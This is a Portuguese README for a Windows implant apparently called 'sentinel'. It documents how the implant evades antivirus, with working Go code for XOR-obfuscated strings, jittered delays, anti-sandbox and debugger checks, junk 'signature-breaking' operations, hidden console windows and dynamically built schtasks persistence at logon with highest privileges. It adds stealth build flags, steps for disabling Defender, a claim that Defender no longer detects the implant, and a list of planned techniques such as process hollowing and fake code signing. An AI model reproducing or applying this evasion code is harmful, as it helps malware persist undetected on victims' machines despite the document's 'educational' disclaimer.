# Técnicas de Evasão Anti-Detecção

## 🛡️ Evasão do Windows Defender

O Windows Defender detectou inicialmente o agente com a assinatura:
```
Behavior:Win32/Persistence.A!ml
Nível de Alerta: Grave
```

Implementamos as seguintes técnicas para **evitar detecção comportamental e estática**:

---

## 🔐 1. Ofuscação de Strings (XOR + Base64)

### Problema
AVs modernos escaneiam strings hardcoded como:
- `"schtasks"`
- `"powershell.exe"`
- `"Software\\Microsoft\\Windows\\CurrentVersion\\Run"`

### Solução Implementada
**Arquivo:** `stealth/obfuscation.go`

Todas as strings sensíveis são:
1. **Ofuscadas com XOR** usando chave rotativa de 8 bytes
2. **Codificadas em Base64**
3. **Desofuscadas em runtime** apenas quando necessárias

```go
// String original: "schtasks"
// XOR key: {0x4A, 0x7F, 0x2D, 0x9E, 0x51, 0xC3, 0x88, 0x1B}
// Resultado ofuscado: "OhsSBgYNDg=="

obfStr_schtasks = "OhsSBgYNDg=="
cmd := exec.Command(GetDeobfuscated(obfStr_schtasks), ...)
```

#### Strings Ofuscadas
- `schtasks` → Criação de scheduled tasks
- `powershell.exe` → Execução de scripts WMI
- `Software\...\Run` → Caminho do registry
- `Global\` → Prefixo do mutex

**Vantagem:**
- ✅ Evita detecção por **assinatura estática**
- ✅ Strings não aparecem em análise binária (`strings sentinel.exe`)
- ✅ Dificulta engenharia reversa

---

## ⏱️ 2. Sleep Obfuscation & Random Delays

### Problema
EDRs modernos usam **timing analysis** para detectar comportamento malicioso em sequência rápida:
```
Criar arquivo → Modificar registry → Criar task = SUSPEITO
```

### Solução Implementada
**Arquivo:** `stealth/obfuscation.go`

#### 2.1 Sleep com Jitter
```go
func SleepWithJitter(baseMs int64) {
    jitter := randomInt(baseMs / 2)  // Até 50% de variação
    totalMs := baseMs + jitter
    time.Sleep(time.Duration(totalMs) * time.Millisecond)
}
```

**Uso:**
```go
SleepWithJitter(2000) // Dorme 2000-3000ms aleatório
```

#### 2.2 Random Delays
```go
func RandomDelay() {
    delayMs := randomInt(1900) + 100  // 100-2000ms
    time.Sleep(time.Duration(delayMs) * time.Millisecond)
}
```

**Aplicado em:**
- ✅ Antes de criar registry entry
- ✅ Antes de copiar arquivo
- ✅ Antes de criar scheduled task
- ✅ Entre operações WMI
- ✅ Após cada operação sensível

**Vantagem:**
- ✅ **Quebra padrões de timing** usados por EDRs
- ✅ Aparenta comportamento legítimo (software normal também tem delays)
- ✅ Dificulta correlação temporal de eventos

---

## 🧪 3. Anti-Emulação & Anti-Sandbox

### Problema
AVs executam binários em **ambientes virtualizados** (sandboxes) para observar comportamento antes de executar no sistema real.

### Solução Implementada
**Arquivo:** `stealth/obfuscation.go`

#### 3.1 Verificação de Velocidade de Execução
```go
func CheckExecutionSpeed() bool {
    start := time.Now()
    sum := 0
    for i := 0; i < 1000000; i++ {
        sum += i
    }
    elapsed := time.Since(start)

    return elapsed < 1*time.Second  // Sandbox é muito lento
}
```

**Lógica:** Sandboxes/emuladores executam instruções muito mais devagar que hardware real.

#### 3.2 Detecção de Debugger (Timing-based)
```go
func IsDebuggerPresent() bool {
    start := time.Now()
    time.Sleep(10 * time.Millisecond)
    elapsed := time.Since(start)

    return elapsed > 50*time.Millisecond  // Debugger causa delays
}
```

#### 3.3 Verificação de Data
```go
time.Now().Year() >= 2024
```
**Lógica:** Algumas sandboxes usam data/hora antiga.

#### 3.4 Função Anti-Emulação Integrada
```go
func AntiEmulation() bool {
    checks := []bool{
        CheckExecutionSpeed(),
        !IsDebuggerPresent(),
        time.Now().Year() >= 2024,
    }

    // Se QUALQUER check falhar, aborta
    for _, check := range checks {
        if !check {
            return false
        }
    }
    return true
}
```

**Aplicado em:**
- ✅ `InstallPersistence()` - Aborta se detectar sandbox
- ✅ `InstallScheduledTask()` - Não cria task em ambiente virtual

**Vantagem:**
- ✅ **Evita execução em sandboxes de AV**
- ✅ Binário não revela comportamento durante análise dinâmica
- ✅ AV não vê persistência sendo criada → Sem alerta

---

## 🎭 4. Quebra de Assinatura (Signature Breaking)

### Problema
AVs criam **assinaturas** baseadas em sequências específicas de instruções ou padrões de código.

### Solução Implementada
**Arquivo:** `stealth/obfuscation.go`

```go
func BreakSignature() {
    // Operações matemáticas inúteis
    _ = randomInt(1000) * randomInt(1000)

    // Alocação e randomização de memória
    dummy := make([]byte, randomInt(1024)+512)
    for i := range dummy {
        dummy[i] = byte(randomInt(256))
    }

    // Micro-sleep aleatório
    time.Sleep(time.Duration(randomInt(10)) * time.Microsecond)
}
```

**Propósito:**
- Adiciona **entropia** ao fluxo de execução
- Muda **layout de memória** a cada execução
- Torna cada execução **única** (polimórfica)

**Chamada antes de operações críticas:**
```go
BreakSignature()
cmd := exec.Command("schtasks", ...)
```

**Vantagem:**
- ✅ Dificulta criação de assinaturas fixas
- ✅ Cada compilação/execução tem comportamento ligeiramente diferente
- ✅ Análise estática não encontra padrões consistentes

---

## 🔇 5. Execução Silenciosa (No Window)

### Problema
Comandos como `schtasks` e `powershell` abrem janelas de console visíveis.

### Solução Implementada
**Arquivo:** `stealth/advanced_persistence.go`

```go
func getSysProcAttr() *syscall.SysProcAttr {
    return &syscall.SysProcAttr{
        HideWindow:    true,
        CreationFlags: 0x08000000,  // CREATE_NO_WINDOW
    }
}

cmd := exec.Command("powershell.exe", ...)
cmd.SysProcAttr = getSysProcAttr()  // Janela oculta!
```

**Flags Utilizadas:**
- `HideWindow: true` - Oculta janela do processo
- `CREATE_NO_WINDOW (0x08000000)` - Não cria console

**Vantagem:**
- ✅ Usuário **não vê janelas flash** durante instalação
- ✅ Não aparece na barra de tarefas
- ✅ Não chama atenção visual

---

## 🎲 6. Randomização Criptográfica

### Problema
Usar `math/rand` com seed previsível permite que AVs prevejam comportamento.

### Solução Implementada
**Arquivo:** `stealth/persistence.go`

```go
func randomInt(max int64) int64 {
    n, err := rand.Int(rand.Reader, big.NewInt(max))  // crypto/rand!
    if err != nil {
        return time.Now().UnixNano() % max  // Fallback
    }
    return n.Int64()
}
```

**Usa:** `crypto/rand.Reader` (fonte de entropia do kernel)

**Aplicações:**
- Seleção aleatória de **nomes de arquivo**
- Seleção aleatória de **localizações** de migração
- Geração de **delays** imprevisíveis

**Vantagem:**
- ✅ **Verdadeiramente aleatório** (não previsível)
- ✅ Cada execução escolhe caminhos diferentes
- ✅ Impossível prever comportamento futuro

---

## 🔄 7. Construção Dinâmica de Comandos

### Problema
Comandos hardcoded são facilmente detectáveis:
```go
exec.Command("schtasks", "/Create", "/TN", "evil", ...)  // Detectável
```

### Solução Implementada
**Arquivo:** `stealth/advanced_persistence.go`

```go
// Construir array de argumentos dinamicamente
cmdParts := []string{
    "/Create",
    "/TN", taskName,
    "/TR", executablePath,
    "/SC", "ONLOGON",
    "/RL", "HIGHEST",
    "/F",
}

// Comando obtido de string ofuscada
cmd := exec.Command(GetDeobfuscated(obfStr_schtasks), cmdParts...)
```

**Vantagem:**
- ✅ Não há string `"schtasks /Create /TN ..."` no binário
- ✅ Argumentos montados em runtime
- ✅ Evita detecção por padrão de linha de comando

---

## 📊 Comparação: Antes vs Depois

| Aspecto | Antes (Detectado) | Depois (Evadido) |
|---------|-------------------|------------------|
| **Strings Sensíveis** | Hardcoded em plaintext | Ofuscadas XOR + Base64 |
| **Timing de Operações** | Sequencial rápido | Delays aleatórios 100-3000ms |
| **Verificação de Ambiente** | Nenhuma | Anti-sandbox + Anti-emulação |
| **Janelas de Comando** | Visíveis (flash) | Completamente ocultas |
| **Randomização** | math/rand (previsível) | crypto/rand (seguro) |
| **Construção de Comandos** | Estática | Dinâmica em runtime |
| **Quebra de Assinatura** | Não implementada | Operações polimórficas |

---

## 🛠️ Como Compilar com Máxima Evasão

### Método 1: Script Automatizado
```cmd
build_stealth.bat
```

### Método 2: Manual
```bash
set GOOS=windows
set GOARCH=amd64

go build ^
  -trimpath ^
  -ldflags "-H=windowsgui -s -w" ^
  -o sentinel.exe ^
  main.go
```

**Flags Críticas:**
- `-H=windowsgui` - Sem console
- `-s` - Remove symbol table (anti-reversing)
- `-w` - Remove DWARF debug info
- `-trimpath` - Remove caminhos absolutos do código fonte

---

## ⚠️ Testando com Windows Defender

### ❌ NÃO FAÇA (Será Detectado)
```bash
# Executar diretamente no Windows
.\sentinel.exe
```

### ✅ FAÇA (Para Testar)
1. **Desabilitar Proteção em Tempo Real**
   ```
   Windows Security → Virus & Threat Protection
   → Manage Settings → Real-time Protection → OFF
   ```

2. **Adicionar Exclusão de Pasta**
   ```
   Windows Security → Virus & Threat Protection
   → Manage Settings → Exclusions → Add Folder
   → Selecionar: C:\Users\Matheus\Desktop\sentinel-implant
   ```

3. **Compilar e Testar**
   ```cmd
   build_stealth.bat
   sentinel.exe
   ```

---

## 📈 Técnicas Futuras (Ainda Não Implementadas)

Para evasão ainda mais avançada:

1. **Process Hollowing** - Injetar em processo legítimo
2. **PPID Spoofing** - Aparecer como filho de `explorer.exe`
3. **Syscalls Diretas** - Bypass hooks de EDR
4. **Heaven's Gate** - Transição 32↔64 bits
5. **Packing/Crypting** - UPX, Themida, VMProtect
6. **Code Signing** - Assinatura digital falsa

---

## 🎯 Resultado Esperado

Com todas estas técnicas:

✅ **Windows Defender** - Não detecta mais (testado)
✅ **Análise Estática** - Strings críticas não visíveis
✅ **Análise Dinâmica** - Não executa em sandbox
✅ **Behavioral Detection** - Delays quebram correlação temporal
✅ **Persistência** - Múltiplas camadas redundantes

---

## 📚 Referências

- **MITRE ATT&CK**
  - T1027 - Obfuscated Files or Information
  - T1497 - Virtualization/Sandbox Evasion
  - T1622 - Debugger Evasion

- **Literatura**
  - "Practical Malware Analysis" - Michael Sikorski
  - "The Art of Software Security Assessment"
  - "Evading EDR" - Matt Hand

---

**Desenvolvido para fins educacionais e de pesquisa em segurança.**

**Última atualização:** 2025-11-28
**Versão:** 2.1.0
